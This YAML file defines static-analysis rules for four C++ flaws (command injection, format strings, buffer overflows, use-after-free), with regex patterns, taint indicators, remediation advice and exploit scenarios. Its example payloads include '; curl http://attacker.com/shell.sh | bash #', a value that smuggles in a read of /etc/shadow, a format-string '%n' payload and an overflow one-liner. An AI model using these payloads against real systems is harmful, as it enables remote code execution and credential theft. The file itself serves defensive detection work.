rules:
- rule_id: CPP-INJ-001
  title: Command Injection via system() or popen()
  description: 'Detects use of system(), popen(), or exec*() family with user-controlled input in C++ applications, enabling
    arbitrary OS command execution.

    '
  language: cpp
  category: injection
  severity: Critical
  confidence: 0.95
  cwe: CWE-78
  owasp: A03:2021-Injection
  tags:
  - command-injection
  - system-call
  - rce
  - popen
  - exec
  - posix
  patterns:
  - type: regex
    pattern: \bsystem\s*\(\s*(?:argv|user_input|input|param|query|buf|buffer|cmd|command)\b
  - type: regex
    pattern: \bpopen\s*\(\s*(?:argv|user_input|input|param|query|buf|buffer|cmd)\b
  - type: regex
    pattern: \bsystem\s*\(\s*(?:std::)?string\s*\(\s*"[^"]*"\s*\)\s*\+\s*\w+
  - type: regex
    pattern: \bsystem\s*\(\s*(?:sprintf_buffer|formatted|str\.c_str\(\))\b
  - type: regex
    pattern: \bexecl\s*\(\s*"/bin/sh"\s*,\s*"sh"\s*,\s*"-c"
  - type: regex
    pattern: \bsystem\s*\(\s*(?:std::)?(?:string|ostringstream)\s*\([^)]*\)\s*\.(?:c_str|str)\s*\(\s*\)
  - type: regex
    pattern: \b(?:_popen|_wsystem|_wexecl|ShellExecute|ShellExecuteEx)\s*\(\s*(?:argv|user_input|input|param|cmd|buffer)\b
  - type: regex
    pattern: \bsystem\s*\(\s*(?:getenv|std::getenv)\s*\(
  anti_patterns:
  - execvp(
  - execv(
  - fork()
  - // hardcoded
  - posix_spawn(
  - posix_spawnp(
  - CreateProcessW(
  - const char* cmd = "
  - static const
  - constexpr
  context_awareness:
    surrounding_context_patterns:
    - '#include <cstdlib>'
    - '#include <stdlib.h>'
    - '#include <unistd.h>'
    - '#include <stdio.h>'
    - '#include <process.h>'
    - '#include <windows.h>'
    - int main(
    - using namespace std
    taint_source_indicators:
    - argv[
    - argc
    - std::cin
    - getline(
    - scanf(
    - fgets(
    - getenv(
    - std::getenv(
    - recv(
    - read(
    - fread(
    - getchar(
    taint_sink_indicators:
    - system(
    - popen(
    - execl(
    - execlp(
    - execle(
    - _popen(
    - _wsystem(
    - ShellExecute(
    - WinExec(
    - CreateProcess(
    sanitization_patterns:
    - execvp with array
    - fork + exec
    - posix_spawn
    - allowlist validation
    - isalnum check
    - regex validation
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 + privilege_level_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A C++ web service builds a command string using user-provided filename: system(("convert " + user_filename
      + " output.png").c_str()). An attacker provides filename="; cat /etc/shadow > /tmp/leaked.txt #" to exfiltrate sensitive
      system files.

      '
    example_payload: '; curl http://attacker.com/shell.sh | bash #'
    attacker_objective: Execute arbitrary OS commands with the privileges of the C++ application, potentially gaining root
      access on misconfigured systems.
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  impact: 'Remote code execution through OS command injection in native applications.

    C++ applications often run with elevated privileges, making command injection

    especially dangerous. Successful exploitation can lead to full system compromise,

    data exfiltration, lateral movement, or persistent backdoor installation.

    '
  remediation: "Framework-specific fixes:\n  - POSIX: use fork()/execvp() with explicit argument arrays\n  - Windows: use\
    \ CreateProcessW() with explicit argument lists, avoid ShellExecute with user input\n  - Qt: use QProcess with argument\
    \ list instead of single command string\n  - Boost: use boost::process::child with args vector\nSecure libraries:\n  -\
    \ POSIX posix_spawn() / posix_spawnp() with argv arrays\n  - Boost.Process with explicit argument vectors\n  - Qt QProcess::start(program,\
    \ arguments) with separate arguments\nPrevention strategies:\n  - Use exec*() family without shell interpretation\n  -\
    \ Use fork()/execvp() with explicit argument arrays\n  - Validate input against strict character allowlists (alphanumeric\
    \ only)\n  - Use POSIX spawn() instead of system()\n  - Never pass user input through a shell interpreter\n  - Apply SELinux/AppArmor\
    \ policies to restrict process capabilities\n  - Use compile-time checks and static analysis (Coverity, Clang-Tidy)\n"
  references:
  - https://cwe.mitre.org/data/definitions/78.html
  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: low
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: false
    high_impact_flag: true
    related_rules:
    - CPP-INJ-002
    - CPP-INJ-003
    - RUBY-INJ-002
    - RUST-INJ-002
  detection_layer: 1
- rule_id: CPP-INJ-002
  title: Format String Vulnerability
  description: 'Detects format string vulnerabilities where user-controlled input is passed as the format string to printf/sprintf
    family functions, enabling memory reads, writes, and potential code execution.

    '
  language: cpp
  category: injection
  severity: High
  confidence: 0.94
  cwe: CWE-134
  owasp: A03:2021-Injection
  tags:
  - format-string
  - memory-corruption
  - rce
  - printf
  - syslog
  - information-disclosure
  patterns:
  - type: regex
    pattern: \b(?:printf|fprintf|sprintf|snprintf|vprintf|vfprintf|vsprintf|vsnprintf)\s*\(\s*(?:argv|user_input|input|param|buf|buffer|str|data)\b
  - type: regex
    pattern: \bprintf\s*\(\s*(?:argv\[\d+\]|input|user_input|param|buf)\b
  - type: regex
    pattern: \b(?:syslog|err|warn)\s*\(\s*\w+\s*,\s*(?:argv|user_input|input|param|buf)\b
  - type: regex
    pattern: \bsprintf\s*\(\s*\w+\s*,\s*(?:argv|user_input|input|param)\b
  - type: regex
    pattern: \b(?:wprintf|fwprintf|swprintf|vswprintf)\s*\(\s*(?:argv|user_input|input|param|buf|buffer)\b
  - type: regex
    pattern: \bsyslog\s*\(\s*LOG_\w+\s*,\s*(?:argv|user_input|input|param|buf)\b
  - type: regex
    pattern: \b(?:fprintf|printf)\s*\(\s*(?:stderr|stdout)\s*,\s*(?:argv|user_input|input|param|buf)\b
  anti_patterns:
  - printf("%s"
  - printf("%d"
  - snprintf(.*"%s".*input
  - printf("%.*s"
  - std::cout
  - std::cerr
  - fmt::format
  - 'spdlog::'
  - std::format
  - LOG(
  context_awareness:
    surrounding_context_patterns:
    - '#include <stdio.h>'
    - '#include <cstdio>'
    - '#include <syslog.h>'
    - '#include <err.h>'
    - '#include <wchar.h>'
    - int main(
    - void handle_request
    taint_source_indicators:
    - argv[
    - std::cin
    - getline(
    - scanf(
    - fgets(
    - recv(
    - read(
    - getenv(
    - fread(
    - recvfrom(
    taint_sink_indicators:
    - printf(
    - fprintf(
    - sprintf(
    - snprintf(
    - syslog(
    - err(
    - warn(
    - wprintf(
    - vprintf(
    - vsprintf(
    sanitization_patterns:
    - explicit format string
    - '"%s"'
    - '"%d"'
    - std::cout
    - fmt::format
    - std::format
    - spdlog
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 + memory_write_capability_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A network daemon logs client-provided hostnames using syslog(LOG_INFO, hostname). An attacker connects
      with a hostname set to "%x.%x.%x.%x.%n", reading stack memory and then writing to an arbitrary address to hijack control
      flow.

      '
    example_payload: '%08x.%08x.%08x.%08x.%n'
    attacker_objective: Read sensitive data from stack memory (credentials, addresses), write to arbitrary memory locations
      to hijack control flow, or crash the application.
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  impact: 'Format string attacks enable reading stack memory (information disclosure),

    writing to arbitrary memory addresses (code execution via GOT overwrite

    or return address manipulation), crashing applications (denial of service),

    and bypassing ASLR/stack canaries through information leaks.

    '
  remediation: "Framework-specific fixes:\n  - C: always use explicit format strings: printf(\"%s\", user_input)\n  - C++:\
    \ prefer std::cout, std::format (C++20), or fmt::format over printf family\n  - Syslog: always use syslog(priority, \"\
    %s\", user_message)\n  - Qt: use qDebug() << variable instead of printf-style formatting\nSecure libraries:\n  - {fmt}\
    \ library (fmtlib/fmt) for type-safe formatting\n  - spdlog for type-safe logging\n  - std::format (C++20) for compile-time\
    \ checked formatting\n  - Boost.Format for safe string formatting\nPrevention strategies:\n  - Never pass user input as\
    \ the format string parameter\n  - Use compiler warnings: -Wformat -Wformat-security -Werror=format-security\n  - Use\
    \ static analysis tools (Coverity, Clang-Tidy, cppcheck) to detect format string bugs\n  - Enable FORTIFY_SOURCE: compile\
    \ with -D_FORTIFY_SOURCE=2\n  - Use GCC's __attribute__((format)) to validate format string functions\n  - Deploy with\
    \ ASLR, stack canaries, and non-executable stack as defense in depth\n"
  references:
  - https://cwe.mitre.org/data/definitions/134.html
  - https://owasp.org/www-community/attacks/Format_string_attack
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: low
  cross_rule_intelligence:
    cross_file_risk_flag: false
    requires_ai_validation: false
    high_impact_flag: true
    related_rules:
    - CPP-INJ-001
    - CPP-INJ-003
  detection_layer: 1
- rule_id: CPP-INJ-003
  title: Buffer Overflow via Unsafe String Functions
  description: 'Detects use of unsafe C string functions (strcpy, strcat, gets, sprintf) that do not perform bounds checking,
    leading to buffer overflow vulnerabilities.

    '
  language: cpp
  category: injection
  severity: High
  confidence: 0.92
  cwe: CWE-120
  owasp: A03:2021-Injection
  tags:
  - buffer-overflow
  - memory-safety
  - stack-smashing
  - heap-corruption
  - strcpy
  - gets
  patterns:
  - type: regex
    pattern: \b(?:strcpy|strcat|gets|sprintf|vsprintf)\s*\(
  - type: regex
    pattern: \bscanf\s*\(\s*"%s"
  - type: regex
    pattern: \bstrcpy\s*\(\s*\w+\s*,\s*(?:argv|input|user|buf|param|data)\b
  - type: regex
    pattern: \bstrcat\s*\(\s*\w+\s*,\s*(?:argv|input|user|buf|param|data)\b
  - type: regex
    pattern: \bgets\s*\(\s*\w+\s*\)
  - type: regex
    pattern: \bscanf\s*\(\s*"%\d*s"\s*,\s*(?:argv|input|user|buf|param|data)\b
  - type: regex
    pattern: \b(?:wcscpy|wcscat|_tcscpy|_tcscat|lstrcpy|lstrcpyA|lstrcpyW)\s*\(
  anti_patterns:
  - strncpy
  - strncat
  - snprintf
  - std::string
  - strlcpy
  - strlcat
  - StringCchCopy
  - StringCbCopy
  - wcsncpy
  - memcpy_s
  - strcpy_s
  - strcat_s
  - std::array
  - std::vector
  - gsl::span
  context_awareness:
    surrounding_context_patterns:
    - '#include <string.h>'
    - '#include <cstring>'
    - '#include <stdio.h>'
    - '#include <stdlib.h>'
    - '#include <wchar.h>'
    - char.*\[.*\]
    - char\s*\*
    - int main(
    taint_source_indicators:
    - argv[
    - std::cin
    - getline(
    - scanf(
    - fgets(
    - recv(
    - read(
    - getenv(
    - fread(
    - recvfrom(
    - gets(
    taint_sink_indicators:
    - strcpy(
    - strcat(
    - gets(
    - sprintf(
    - vsprintf(
    - scanf(
    - wcscpy(
    - wcscat(
    - lstrcpy(
    - memcpy(
    sanitization_patterns:
    - strlen check
    - sizeof check
    - bounds check
    - if (len < sizeof
    - strnlen
    - std::min
  severity_scoring:
    severity_weight: 9
    risk_score_formula_hint: severity_weight * confidence * (1 + stack_vs_heap_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A network service reads a username from a socket into a fixed-size stack buffer using strcpy(username_buf,
      received_data). An attacker sends an oversized username string to overwrite the return address on the stack, redirecting
      execution to attacker-controlled shellcode or a ROP chain.

      '
    example_payload: python -c "print('A'*256 + '\xef\xbe\xad\xde')"
    attacker_objective: Overwrite return addresses or function pointers to hijack control flow, execute arbitrary shellcode,
      or leverage ROP chains for code execution.
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: medium
    sanitization_absence: high
  impact: 'Buffer overflow enables stack smashing, heap corruption, code execution

    via return address overwrite, ROP chain exploitation, and denial of service.

    Modern exploit mitigations (ASLR, stack canaries, DEP/NX) reduce but do

    not eliminate the risk. Information leaks from other bugs (e.g., format

    strings) can be chained to bypass these protections.

    '
  remediation: "Framework-specific fixes:\n  - POSIX/Linux: replace strcpy with strlcpy (BSD) or strncpy with null termination\n\
    \  - Windows: use StringCchCopy/StringCbCopy from strsafe.h or strcpy_s from safecrt\n  - Qt: use QString instead of C-style\
    \ char arrays\n  - Embedded: use bounded copy functions with explicit size parameters\nSecure libraries:\n  - std::string\
    \ in C++ instead of C-style strings (strongly preferred)\n  - gsl::span and gsl::string_span from Guideline Support Library\n\
    \  - SafeInt library for integer overflow checks before allocation\n  - strlcpy/strlcat (BSD-origin safe string functions)\n\
    \  - Microsoft Safe CRT functions (strcpy_s, strcat_s, sprintf_s)\nPrevention strategies:\n  - Replace strcpy with strncpy/strlcpy\
    \ and always null-terminate\n  - Replace strcat with strncat/strlcat\n  - Replace sprintf with snprintf\n  - Replace gets\
    \ with fgets (gets is removed in C11)\n  - Use std::string in C++ instead of C-style strings\n  - Enable stack protection:\
    \ -fstack-protector-strong\n  - Enable address sanitizer in testing: -fsanitize=address\n  - Compile with -D_FORTIFY_SOURCE=2\
    \ for runtime buffer overflow detection\n  - Use Valgrind/ASan/MSan in CI/CD for memory safety testing\n  - Follow C++\
    \ Core Guidelines and use the Guideline Support Library\n"
  references:
  - https://cwe.mitre.org/data/definitions/120.html
  - https://cheatsheetseries.owasp.org/cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: low
  cross_rule_intelligence:
    cross_file_risk_flag: false
    requires_ai_validation: false
    high_impact_flag: true
    related_rules:
    - CPP-INJ-001
    - CPP-INJ-002
  detection_layer: 1
- rule_id: CPP-INJ-004
  title: Use-After-Free Vulnerability
  description: 'Detects use-after-free vulnerabilities where heap-allocated memory is accessed after being freed, leading
    to dangling pointer dereferences. Attackers can reclaim the freed memory region with controlled data, enabling arbitrary
    read/write primitives, vtable hijacking in C++ objects, and ultimately remote code execution. This class of bug is among
    the most exploited in modern real-world attacks against browsers, kernels, and network daemons.

    '
  language: cpp
  category: injection
  severity: Critical
  confidence: 0.91
  cwe: CWE-416
  owasp: A06:2021-Vulnerable and Outdated Components
  tags:
  - use-after-free
  - dangling-pointer
  - memory-corruption
  - heap-exploitation
  - vtable-hijack
  - double-free
  - temporal-safety
  detection_layer: 3
  attack_surface_type: memory-management
  patterns:
  - type: regex
    description: free() followed by usage of same pointer variable on subsequent lines
    pattern: \bfree\s*\(\s*(\w+)\s*\)\s*;[^}]*\b\1\b
  - type: regex
    description: delete on a pointer followed by dereference without nulling
    pattern: \bdelete\s+(\w+)\s*;(?!\s*\1\s*=\s*nullptr)[^}]*\1\s*->
  - type: regex
    description: delete[] on array pointer followed by access without null assignment
    pattern: \bdelete\s*\[\]\s*(\w+)\s*;(?!\s*\1\s*=\s*nullptr)[^}]*\1\s*\[
  - type: regex
    description: Pointer used after conditional free without null guard
    pattern: \bif\s*\([^)]*\)\s*\{[^}]*\bfree\s*\(\s*(\w+)\s*\)\s*;[^}]*\}[^}]*\b\1\b
  - type: regex
    description: Object method call on a pointer that was previously deleted
    pattern: \bdelete\s+(\w+)\s*;[^}]*\1\s*->\s*\w+\s*\(
  - type: regex
    description: Returning a pointer to stack-local or freed memory
    pattern: \bfree\s*\(\s*(\w+)\s*\)\s*;[^}]*\breturn\s+\1\s*;
  - type: regex
    description: 'Double-free pattern: free called twice on same pointer'
    pattern: \bfree\s*\(\s*(\w+)\s*\)\s*;[^}]*\bfree\s*\(\s*\1\s*\)\s*;
  - type: regex
    description: shared_ptr/unique_ptr release followed by raw pointer usage
    pattern: \.release\s*\(\s*\)\s*;[^}]*\b(?:->|\.get\s*\(\s*\))
  anti_patterns:
  - = nullptr
  - = NULL
  - = 0;
  - std::unique_ptr
  - std::shared_ptr
  - std::weak_ptr
  - boost::shared_ptr
  - std::make_unique
  - std::make_shared
  - gsl::owner
  - RAII
  bypass_variants:
  - description: 'Aliased pointer: freed through one alias, accessed through another'
    pattern: \w+\s*=\s*(\w+)\s*;[^}]*\bfree\s*\(\s*\1\s*\)\s*;
  - description: Container element freed while iterator still references it
    pattern: \bdelete\s+\*\s*it\s*;[^}]*\bit\s*->
  - description: Freed pointer passed to another function that dereferences it
    pattern: \bfree\s*\(\s*(\w+)\s*\)\s*;[^}]*\b\w+\s*\(\s*\1\s*[,)]
  evasion_indicators:
  - Pointer aliasing across multiple variables before free
  - Free in error/exception handler with continued use in normal path
  - Callback or signal handler that frees memory still referenced by main thread
  - Cross-function free where the caller retains a stale copy of the pointer
  encoding_variants:
  - type: macro_obfuscation
    pattern: \b(?:SAFE_FREE|MY_DELETE|RELEASE_PTR)\s*\(\s*\w+\s*\)
  - type: custom_allocator
    pattern: \b(?:pool_free|arena_dealloc|mem_release|custom_free)\s*\(\s*\w+\s*\)
  - type: indirect_free
    pattern: \bvoid\s*\(\s*\*\s*free_fn\s*\)\s*\(
  multi_function_chain_patterns:
  - malloc -> use -> free -> use (same pointer, no null assignment)
  - new -> store in container -> delete -> container access
  - acquire_resource -> release_resource -> access_resource (lifecycle violation)
  privilege_context_flags:
    requires_auth_context: false
    admin_only_risk: false
    escalation_vector: Heap memory reclamation allows vtable pointer overwrite, enabling arbitrary code execution with the
      privileges of the vulnerable process.
  business_logic_indicator:
    financial_impact: true
    data_exposure_risk: true
    compliance_relevant: true
  probable_taint_paths:
  - source: malloc/new allocation from user-controlled size or network data
    sink: Dereferencing pointer after free/delete
    through: 'Heap allocator reuse: attacker-controlled allocation reclaims the freed chunk, placing controlled data at the
      dangling pointer location'
  - source: Object constructor with attacker-influenced fields
    sink: Virtual method call on deleted object
    through: Vtable pointer overwrite via heap spray after free
  impact: 'Use-after-free is one of the most dangerous memory corruption classes.

    Exploitation enables arbitrary code execution through vtable hijacking,

    heap metadata corruption, and function pointer overwrite. Attackers can

    use heap spraying or feng shui techniques to reclaim freed memory with

    controlled content, gaining reliable exploitation primitives. UAF bugs

    account for a large proportion of real-world browser, kernel, and server

    exploits. They can bypass ASLR when combined with information leaks and

    defeat CFI/CET when exploiting virtual dispatch.

    '
  remediation: "Framework-specific fixes:\n  - Modern C++: use std::unique_ptr for exclusive ownership, std::shared_ptr for\
    \ shared ownership\n  - Legacy C: always set pointers to NULL immediately after free()\n  - Qt: use QPointer for guarded\
    \ QObject pointers that auto-null on deletion\n  - Chromium: use base::raw_ptr<T> or raw_ref<T> with BackupRefPtr (MiraclePtr)\n\
    Secure libraries:\n  - Smart pointers (std::unique_ptr, std::shared_ptr, std::weak_ptr)\n  - Guideline Support Library\
    \ gsl::owner<T*> for ownership annotation\n  - Boost.SmartPtr for cross-platform smart pointer support\n  - Rust FFI bindings\
    \ for memory-critical components\nPrevention strategies:\n  - Adopt RAII principles: tie resource lifetime to object lifetime\n\
    \  - Set freed pointers to nullptr immediately after free/delete\n  - Use AddressSanitizer (-fsanitize=address) to detect\
    \ UAF at runtime\n  - Use MemorySanitizer and UBSan for additional temporal safety checks\n  - Enable Clang's -fsanitize=memory\
    \ and -fsanitize=undefined in CI\n  - Use static analyzers: Clang Static Analyzer, Coverity, Infer (Facebook)\n  - Deploy\
    \ with hardware-assisted tagging (ARM MTE) where available\n  - Consider memory-safe language rewrites for critical parsing/network\
    \ code\n  - Enforce C++ Core Guidelines lifetime profiles via compiler tooling\n"
  references:
  - https://cwe.mitre.org/data/definitions/416.html
  - https://owasp.org/www-community/vulnerabilities/Using_freed_memory
  - https://chromium.googlesource.com/chromium/src/+/HEAD/docs/dangling_ptr.md
  context_awareness:
    surrounding_context_patterns:
    - '#include <stdlib.h>'
    - '#include <cstdlib>'
    - '#include <memory>'
    - '#include <new>'
    - class.*virtual
    - struct.*{
    - void* operator new
    taint_source_indicators:
    - malloc(
    - calloc(
    - realloc(
    - 'new '
    - new[]
    - strdup(
    - mmap(
    - operator new(
    taint_sink_indicators:
    - free(
    - 'delete '
    - delete[]
    - realloc(
    - munmap(
    - operator delete(
    - cfree(
    sanitization_patterns:
    - = nullptr
    - = NULL
    - = 0
    - std::unique_ptr
    - std::shared_ptr
    - std::move
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 + heap_controllability_factor + vtable_presence_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A C++ HTTP server manages session objects on the heap. When a client disconnects, the session object
      is deleted but a reference is retained in a global lookup table. An attacker triggers a disconnect, then rapidly creates
      a new connection whose allocation reclaims the freed session memory. The attacker crafts their request to overwrite
      the vtable pointer of the stale session object. When the server processes a queued callback referencing the old session,
      it calls a virtual method through the attacker-controlled vtable, redirecting execution to shellcode placed in the replacement
      allocation.

      '
    example_payload: Heap spray with 0x41414141 vtable pointer + ROP chain payload in reclaimed chunk
    attacker_objective: Reclaim freed heap memory with attacker-controlled data to hijack virtual method dispatch or function
      pointers, achieving arbitrary code execution.
  confidence_factors:
    pattern_strength: medium
    context_match: high
    proximity_to_user_input: medium
    sanitization_absence: high
  metadata:
    rule_version: 3.0.0
    last_reviewed: '2025-01-15'
